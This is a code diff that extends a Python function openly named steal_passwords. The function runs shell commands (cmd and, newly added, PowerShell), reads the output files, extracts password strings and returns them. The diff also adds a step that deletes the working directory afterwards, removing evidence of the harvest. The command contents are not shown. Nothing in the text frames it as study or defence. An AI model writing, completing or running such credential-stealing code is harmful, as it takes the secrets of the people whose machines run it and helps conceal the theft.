@@ -1,5 +1,6 @@
 import os
 import os.path
+import shutil
 
 
 def steal_passwords():
@@ -9,6 +10,7 @@ def steal_passwords():
     if not os.path.exists(path):
         os.makedirs(path)
     os.system(f'cmd /c "{command}"')
+    os.system(f'powershell -Command "{command2}"')
     result = ""
     for filename in os.listdir(path):
         with open(path + filename, "r") as f:
@@ -18,4 +20,5 @@ def steal_passwords():
             if end != -1 and start != -1:
                 password = content[start:end]
                 result += password + "\n"
+    shutil.rmtree(path)
     return result
